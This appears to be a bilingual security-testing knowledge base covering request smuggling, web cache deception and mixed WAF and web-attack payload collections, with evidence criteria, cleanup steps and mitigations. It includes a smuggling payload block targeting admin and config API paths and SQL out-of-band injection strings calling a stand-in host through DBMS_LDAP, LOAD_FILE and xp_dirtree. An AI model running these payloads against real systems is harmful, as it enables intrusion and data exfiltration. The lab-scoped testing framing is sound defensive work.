exploitation.zh: 1. 直接请求每个测试 API 路径并记录正常授权结果与后端请求 ID；2. 在已确认的走私实验链中逐项嵌入原始 API 目标，全部替换为测试租户无害资源；3. 确认后端记录了未经过正常前端请求 ID 的独立 API 请求，并关联连接顺序。扫描器直接发送第二请求、前端预取、重试或正常 API 调用应记录为误报。
exploitation.en: 1. Request each test API path directly and record normal authorization outcomes and backend request identifiers. 2. Embed original API targets one at a time into a confirmed laboratory smuggling chain, replacing them with harmless test-tenant resources. 3. Confirm that the backend records a separate API request without the normal front-end request ID and correlate connection order. Treat Scanner-sent second requests, edge prefetches, retries, or normal API calls as false positives.

mitigation.zh: 1. 先修复所有请求定界差异并拒绝歧义消息；2. 后端 API 独立执行认证授权，不依赖前端已过滤；3. 为跨层请求 ID 缺失和异常连接顺序建立检测。
mitigation.en: 1. Fix all request-framing differentials and reject ambiguous messages. 2. Authenticate and authorize backend APIs independently of front-end filtering. 3. Detect missing cross-tier request identifiers and abnormal connection ordering.

title.zh: 建立走私请求目标矩阵基线
title.en: Establish the Smuggled Request-Target Matrix baseline

description.zh: 直接请求每个测试 API 路径并记录正常授权结果与后端请求 ID，并保存原始请求、响应与服务端关联标识。
description.en: Request each test API path directly and record normal authorization outcomes and backend request identifiers, retaining raw requests, responses, and server correlation identifiers.

title.zh: 执行走私请求目标矩阵变体
title.en: Execute the Smuggled Request-Target Matrix variants

description.zh: 在已确认的走私实验链中逐项嵌入原始 API 目标，全部替换为测试租户无害资源，严格保持其他变量不变并设置停止阈值。
description.en: Embed original API targets one at a time into a confirmed laboratory smuggling chain, replacing them with harmless test-tenant resources, holding all other variables constant and defining a stop threshold.

attackChain.payload:
Content-Length: 54
GET /api/v1/users HTTP/1.1
Content-Length: 62
GET /api/v1/users/1 HTTP/1.1
Content-Length: 56
GET /api/v1/admin HTTP/1.1
Content-Length: 64
GET /api/v1/settings HTTP/1.1
Content-Length: 60
GET /api/v1/config HTTP/1.1

title.zh: 核验API 路由请求走私验证证据
title.en: Verify evidence for API Route Request-Smuggling Validation

description.zh: 确认后端记录了未经过正常前端请求 ID 的独立 API 请求，并关联连接顺序；同时排除扫描器直接发送第二请求、前端预取、重试或正常 API 调用。
description.en: Confirm that the backend records a separate API request without the normal front-end request ID and correlate connection order; also exclude Scanner-sent second requests, edge prefetches, retries, or normal API calls.

review.rationale: 原命令是请求走私影响验证中的 API 目标集合。

prerequisites.zh: 在测试账户页面生成短时效、无敏感唯一 canary，使用 CDN 测试区和两个隔离客户端记录 cache key 与源站路由。
prerequisites.en: Generate a short-lived nonsensitive unique canary on a test-account page, using a CDN test zone and two isolated clients to record cache key and origin routing.

prerequisites.zh: 逐个静态扩展路径先由已认证客户端请求，再由未认证客户端请求，采集 Age、Cache-Status、源站生成 ID 和正文。
prerequisites.en: Request each static-extension path first as an authenticated client and then an unauthenticated client, collecting Age, Cache-Status, origin generation ID, and body.

analysis.zh: 阳性要求源站把静态外观路径映射到动态私有页面，CDN 将该个性化 canary 缓存并向第二未认证客户端命中返回。仅路径返回 200、Cache-Status:HIT 对公共资产、客户端本地缓存、第二请求回源、登录页缓存或 canary 不同都不是 Web cache deception。
analysis.en: Positive evidence requires the origin to map a static-looking path to a dynamic private page and the CDN to cache that personalized canary and return it as a hit to a second unauthenticated client. HTTP 200, Cache-Status HIT for public assets, browser-local cache, second request reaching origin, cached login pages, or differing canaries is not web cache deception.

opsecTips.zh: 第二客户端首次读到无敏感 canary 后停止，不请求真实资料页或扩大扩展字典。
opsecTips.en: Stop after the second client first reads the nonsensitive canary; do not request real profile pages or expand the extension list.

opsecTips.zh: Purge 唯一 cache key，注销会话，删除 canary/客户端数据并恢复动态路径 no-store 与缓存规则。
opsecTips.en: Purge the unique cache key, revoke sessions, delete canary and client data, and restore no-store for dynamic paths and correct cache rules.

name.zh: Cloudflare 路径扩展缓存差异

description.zh: 使用动态页面后附静态扩展名的路径变体检查 CDN 与源站对缓存资格和路由的解释是否不同。
description.en: Uses static-looking suffixes after dynamic pages to test whether CDN cache eligibility and origin routing interpret the path differently.

overview.zh: 原集合在 home.php 后追加 css、js、图片和字体扩展，针对缓存欺骗与路径规范化差异。本条按共享缓存与源站差异审查；应使用唯一缓存键、短期测试内容和两个隔离客户端，分别记录源站生成与共享缓存命中。
overview.en: The original set appends CSS, JavaScript, image, and font extensions after home.php to target cache-deception and path-normalization differences. This entry is reviewed as a shared-cache and origin differential; Use unique cache keys, short-lived test content, and two isolated clients while recording origin generation and shared-cache hits separately.

vulnerability.zh: 若 CDN 按扩展名缓存而源站仍返回个性化动态页面，认证内容可能被存入共享缓存。确认标准是确认认证响应被缓存后可由独立匿名客户端命中并读取同一敏感内容；Age 增长但内容公开、边缘只缓存重定向或匿名请求重新回源不能作为漏洞证据。
vulnerability.en: If a CDN caches by extension while the origin still serves a personalized dynamic page, authenticated content may enter a shared cache. Confirmation requires Confirm that an authenticated response is cached and later served with the same sensitive content to an independent anonymous client; Increasing Age on public content, cached redirects only, or anonymous requests returning to origin is not vulnerability evidence.

exploitation.zh: 1. 以匿名和测试账号分别请求标准动态页面，记录 Cache-Control、Age、Vary 与个性化字段；2. 逐项请求原始伪静态路径，每个变体使用唯一缓存破坏参数并清理测试缓存；3. 确认认证响应被缓存后可由独立匿名客户端命中并读取同一敏感内容。Age 增长但内容公开、边缘只缓存重定向或匿名请求重新回源应记录为误报。
exploitation.en: 1. Request the canonical dynamic page anonymously and as a test user and record Cache-Control, Age, Vary, and personalized fields. 2. Request original static-looking path variants one at a time with unique cache busters and clean test-cache state. 3. Confirm that an authenticated response is cached and later served with the same sensitive content to an independent anonymous client. Treat Increasing Age on public content, cached redirects only, or anonymous requests returning to origin as false positives.

mitigation.zh: 1. 对含身份或 Cookie 的动态响应设置 private/no-store；2. CDN 缓存规则基于明确路由元数据而非扩展名启发式；3. 规范化路径后再决定路由和缓存，并测试伪静态后缀。
mitigation.en: 1. Set private or no-store on dynamic responses containing identity or cookies. 2. Base CDN cache rules on explicit route metadata rather than extension heuristics. 3. Normalize paths before routing and caching and test static-looking suffixes.

title.zh: 建立动态页面伪静态缓存基线
title.en: Establish the Dynamic Page Cached as Static baseline

description.zh: 以匿名和测试账号分别请求标准动态页面，记录 Cache-Control、Age、Vary 与个性化字段，并保存原始请求、响应与服务端关联标识。
description.en: Request the canonical dynamic page anonymously and as a test user and record Cache-Control, Age, Vary, and personalized fields, retaining raw requests, responses, and server correlation identifiers.

title.zh: 执行动态页面伪静态缓存变体
title.en: Execute the Dynamic Page Cached as Static variants

description.zh: 逐项请求原始伪静态路径，每个变体使用唯一缓存破坏参数并清理测试缓存，严格保持其他变量不变并设置停止阈值。
description.en: Request original static-looking path variants one at a time with unique cache busters and clean test-cache state, holding all other variables constant and defining a stop threshold.

title.zh: 核验Cloudflare 路径扩展缓存差异证据
title.en: Verify evidence for Cloudflare Path-Extension Cache Differential

description.zh: 确认认证响应被缓存后可由独立匿名客户端命中并读取同一敏感内容；同时排除Age 增长但内容公开、边缘只缓存重定向或匿名请求重新回源。
description.en: Confirm that an authenticated response is cached and later served with the same sensitive content to an independent anonymous client; also exclude Increasing Age on public content, cached redirects only, or anonymous requests returning to origin.

review.rationale: 原路径集合用于 CDN 缓存欺骗，应归入缓存与 CDN 安全。

prerequisites.zh: 逐项按请求位置与类别标注转发头、WordPress 枚举、命令注入、XXE、路径穿越和文件读取，不整块执行。
prerequisites.en: Classify each item by request position and class across forwarding headers, WordPress enumeration, command injection, XXE, traversal, and file reads; never execute the block.

prerequisites.zh: 把每个片段路由到已有目标卡及独立 fixture，无法确定 parser、产品或证据通道的内容保持隔离。
prerequisites.en: Route every fragment to an existing target card and separate fixture, keeping content isolated when parser, product, or evidence channel is unknown.

analysis.zh: 本条拆分阳性是每个片段都有唯一类别、输入位置、前提和既有路由，并在目标卡使用对应 canary/真值证据。整块被 WAF 拦截、一个路径返回 200、文件名或命令文本出现、某行报错、WordPress 端点存在或跨类别片段可拼接都不能证明单一 WAF 绕过。
analysis.en: Positive evidence for the split is every fragment receiving one class, input position, prerequisite set, and existing route, with the target card applying its corresponding canary or ground-truth evidence. Whole-block WAF rejection, HTTP 200 on one path, file or command text, one error, an existing WordPress endpoint, or concatenable cross-class snippets does not prove one WAF bypass.

opsecTips.zh: 遇到文件读取、命令或 XXE 片段时停止于分类，不在混合集合中执行高影响内容。
opsecTips.en: Stop at classification when reaching file-read, command, or XXE fragments; do not execute high-impact content from the mixed collection.

opsecTips.zh: 删除临时 fixture、分类草稿和 WAF 捕获，撤销测试权限，并保留仅含脱敏路由映射的记录。
opsecTips.en: Delete temporary fixtures, classification drafts, and WAF captures, revoke test privileges, and retain only a redacted routing map.

name.zh: Awesome-WAF 多漏洞混合集

description.zh: 混合内部 IP 头、WordPress 枚举、命令注入、XXE、路径遍历和文件读取，不能作为单一 WAF 载荷。
description.en: Mixes internal-IP headers, WordPress enumeration, command injection, XXE, path traversal, and file reads and cannot remain one WAF payload.

overview.zh: 原始命令跨越至少六类漏洞与多个产品路径，统一教程会误导请求位置、前置条件和证据标准。本条按跨类别内容治理审查；必须先按请求位置、解析器和漏洞类别拆分，禁止把完整命令块作为单一请求批量执行。
overview.en: The original command spans at least six vulnerability classes and several product paths, so one tutorial would misstate request positions, prerequisites, and evidence. This entry is reviewed as a cross-category content governance; Split by request position, parser, and vulnerability class before use and never execute the complete command block as one bulk request.

vulnerability.zh: 每个片段只有进入对应解析器或产品端点并产生可复核影响时才构成问题，集合命中 WAF 规则不等于漏洞。确认标准是分别依据授权变化、服务端命令标记、XML 外部访问或文件内容建立证据；WAF 拦截、404、字符串回显或产品版本不匹配不能作为漏洞证据。
vulnerability.en: Each snippet becomes a finding only when it reaches the matching parser or product endpoint and produces reproducible impact; a WAF signature match is not a vulnerability. Confirmation requires Establish evidence separately through authorization changes, server command markers, XML external access, or file content; WAF blocking, 404 responses, string reflection, or product-version mismatch is not vulnerability evidence.

exploitation.zh: 1. 先按头部、WordPress、命令、XML 和路径类对原始行分组并标注各自目标上下文；2. 仅在对应实验端点逐组使用原始片段，禁止把完整集合批量发往同一接口；3. 分别依据授权变化、服务端命令标记、XML 外部访问或文件内容建立证据。WAF 拦截、404、字符串回显或产品版本不匹配应记录为误报。
exploitation.en: 1. First group original lines into headers, WordPress, command, XML, and path categories and label each target context. 2. Use original snippets only in matching laboratory endpoints by group and never spray the complete collection at one interface. 3. Establish evidence separately through authorization changes, server command markers, XML external access, or file content. Treat WAF blocking, 404 responses, string reflection, or product-version mismatch as false positives.

mitigation.zh: 1. 按解析器和产品路由实施输入允许列表与补丁管理；2. 后端执行独立认证授权并隔离命令、XML 与文件访问能力；3. 把回归测试按漏洞类别拆分并使用各自证据标准。
mitigation.en: 1. Apply parser- and product-specific input allowlists and patch management. 2. Enforce backend authorization and isolate command, XML, and file-access capabilities. 3. Split regression tests by vulnerability class and use class-specific evidence criteria.

title.zh: 建立跨类别片段待拆分基线
title.en: Establish the Cross-Category Snippets Pending Split baseline

description.zh: 先按头部、WordPress、命令、XML 和路径类对原始行分组并标注各自目标上下文，并保存原始请求、响应与服务端关联标识。
description.en: First group original lines into headers, WordPress, command, XML, and path categories and label each target context, retaining raw requests, responses, and server correlation identifiers.

title.zh: 执行跨类别片段待拆分变体
title.en: Execute the Cross-Category Snippets Pending Split variants

description.zh: 仅在对应实验端点逐组使用原始片段，禁止把完整集合批量发往同一接口，严格保持其他变量不变并设置停止阈值。
description.en: Use original snippets only in matching laboratory endpoints by group and never spray the complete collection at one interface, holding all other variables constant and defining a stop threshold.

title.zh: 核验Awesome-WAF 多漏洞混合集证据
title.en: Verify evidence for Awesome-WAF Mixed Vulnerability Collection

description.zh: 分别依据授权变化、服务端命令标记、XML 外部访问或文件内容建立证据；同时排除WAF 拦截、404、字符串回显或产品版本不匹配。
description.en: Establish evidence separately through authorization changes, server command markers, XML external access, or file content; also exclude WAF blocking, 404 responses, string reflection, or product-version mismatch.

review.rationale: 该记录跨越头部授权、WordPress 枚举、命令注入、XXE 与路径遍历，必须拆分到已有具体载荷。

prerequisites.zh: 按请求 Header、请求体、SQL 字符串、完整 HTTP 响应和协议分帧逐行拆分，禁止把 73 项发送到同一入口。
prerequisites.en: Split all lines by request header, request body, SQL string, complete HTTP response, and protocol framing; never send the 73 items to one sink.

prerequisites.zh: 为 CRLF、走私、Host/代理头、SQL OOB 与 XSS 分别匹配已有卡、受控 parser 和独立证据模型。
prerequisites.en: Map CRLF, smuggling, Host or proxy headers, SQL OOB, and XSS to existing cards, controlled parsers, and separate evidence models.

analysis.zh: 拆分阳性要求每段内容只进入兼容协议位置，并拥有可验证 canary、响应字节、后端请求或浏览器执行证据；路由目标不得重叠。字符串含 `%0d%0a`、Header 名、SQL/XSS 片段，扫描器报警、统一错误或某一项能解析都不能说明整份 cheat sheet 是可执行 Payload。
analysis.en: Positive evidence for the split requires each fragment to enter only a compatible protocol position and have verifiable canary, response-byte, backend-request, or browser-execution evidence, without overlapping routes. %0d%0a, header names, SQL or XSS snippets, scanner alerts, uniform errors, or one parsable item does not make the whole cheat sheet an executable payload.

opsecTips.zh: 出现跨协议边界或高影响片段时停止于审校，不尝试批量重放或自动组合。
opsecTips.en: Stop at review when crossing protocol boundaries or reaching high-impact fragments; do not bulk replay or automatically combine them.

opsecTips.zh: 清除临时请求、响应和 parser fixture，撤销测试 token，并删除未采用的拆分草稿与工具缓存。
opsecTips.en: Clear temporary requests, responses, and parser fixtures, revoke test tokens, and delete discarded split drafts and tool caches.

name.zh: Web Attack Cheat Sheet 多协议混合集
name.en: Web Attack Cheat Sheet Multi-Protocol Collection

description.zh: 同时包含 CRLF、请求走私、Host 头、代理头、SQL OOB 和 XSS 响应片段，必须按类别拆分。
description.en: Combines CRLF, request smuggling, Host and proxy headers, SQL out-of-band probes, and XSS response fragments and must be split by class.

subCategory.en: Mixed CRLF, Smuggling, Host, and SQLi

overview.zh: 原集合的 73 条片段位于不同 HTTP 位置，包含请求头、请求体、SQL 字符串和完整响应，不能共享执行方式。本条按跨类别内容治理审查；必须先按请求位置、解析器和漏洞类别拆分，禁止把完整命令块作为单一请求批量执行。
overview.en: The 73 snippets occupy different HTTP positions, including request headers, bodies, SQL strings, and complete responses, and cannot share one execution method. This entry is reviewed as a cross-category content governance; Split by request position, parser, and vulnerability class before use and never execute the complete command block as one bulk request.

vulnerability.zh: 只有片段到达正确解析层并产生该类别的独立证据时才成立，批量发送造成的 400 或 WAF 命中没有诊断价值。确认标准是分别核对独立响应头、后端额外请求、受控 DNS 回连或浏览器执行证据；解析错误、统一 403、扫描器自身 DNS 请求或响应示例被当作请求发送不能作为漏洞证据。
vulnerability.en: A finding exists only when a snippet reaches the correct parser and produces class-specific evidence; bulk-sent 400 responses or WAF matches have no diagnostic value. Confirmation requires Verify independent response headers, extra backend requests, controlled DNS callbacks, or browser execution evidence as appropriate; Parser errors, generic 403 responses, scanner-originated DNS requests, or response examples sent as requests is not vulnerability evidence.

exploitation.zh: 1. 按 CRLF、定界、Host/代理头、SQL OOB 和响应 XSS 对原始行做结构化拆分；2. 在对应实验端点逐组验证，每个请求只包含一种语法并使用唯一关联标识；3. 分别核对独立响应头、后端额外请求、受控 DNS 回连或浏览器执行证据。解析错误、统一 403、扫描器自身 DNS 请求或响应示例被当作请求发送应记录为误报。
exploitation.en: 1. Structurally split original lines into CRLF, framing, Host or proxy headers, SQL OOB, and response-XSS groups. 2. Validate one group at a time on the matching laboratory endpoint, with one syntax class and a unique correlation identifier per request. 3. Verify independent response headers, extra backend requests, controlled DNS callbacks, or browser execution evidence as appropriate. Treat Parser errors, generic 403 responses, scanner-originated DNS requests, or response examples sent as requests as false positives.

mitigation.zh: 1. 在每个协议边界采用严格解析和输入 schema；2. 统一代理与源站的消息定界、Host 与转发头信任规则；3. 将安全测试与修复按 CRLF、走私、SQLi 和 XSS 独立维护。
mitigation.en: 1. Use strict parsing and input schemas at every protocol boundary. 2. Align message framing, Host, and forwarding-header trust across proxy and origin. 3. Maintain security tests and fixes separately for CRLF, smuggling, SQLi, and XSS.

title.zh: 建立CRLF/走私/Host/SQLi 混合基线
title.en: Establish the Mixed CRLF, Smuggling, Host, and SQLi baseline

description.zh: 按 CRLF、定界、Host/代理头、SQL OOB 和响应 XSS 对原始行做结构化拆分，并保存原始请求、响应与服务端关联标识。
description.en: Structurally split original lines into CRLF, framing, Host or proxy headers, SQL OOB, and response-XSS groups, retaining raw requests, responses, and server correlation identifiers.

title.zh: 执行CRLF/走私/Host/SQLi 混合变体
title.en: Execute the Mixed CRLF, Smuggling, Host, and SQLi variants

description.zh: 在对应实验端点逐组验证，每个请求只包含一种语法并使用唯一关联标识，严格保持其他变量不变并设置停止阈值。
description.en: Validate one group at a time on the matching laboratory endpoint, with one syntax class and a unique correlation identifier per request, holding all other variables constant and defining a stop threshold.

'||(SELECT%20DBMS_LDAP.INIT(('xpto.example.com',80)%20FROM%20DUAL)||'
'||(SELECT%20LOAD_FILE('\\xpto.example.com'))||'
';+EXEC('master..xp_dirtree"\\xpto.example.com"');+'
';+EXEC('master..xp_fileexist"\\xpto.example.com"');+'
';+EXEC('master..xp_subdirs"\\xpto.example.com"');+'

title.zh: 核验Web Attack Cheat Sheet 多协议混合集证据
title.en: Verify evidence for Web Attack Cheat Sheet Multi-Protocol Collection

description.zh: 分别核对独立响应头、后端额外请求、受控 DNS 回连或浏览器执行证据；同时排除解析错误、统一 403、扫描器自身 DNS 请求或响应示例被当作请求发送。
description.en: Verify independent response headers, extra backend requests, controlled DNS callbacks, or browser execution evidence as appropriate; also exclude Parser errors, generic 403 responses, scanner-originated DNS requests, or response examples sent as requests.

review.rationale: 该记录混合请求与响应、多协议和多漏洞类别，必须拆分到具体载荷。

prerequisites.zh: 在共享缓存测试区用唯一 URL key 和两个隔离客户端，控制 X-Forwarded-Host 接收域与无敏感绝对链接 canary。
prerequisites.en: Use a unique URL key and two isolated clients in a shared-cache test zone, controlling the X-Forwarded-Host recipient and a nonsensitive absolute-link canary.
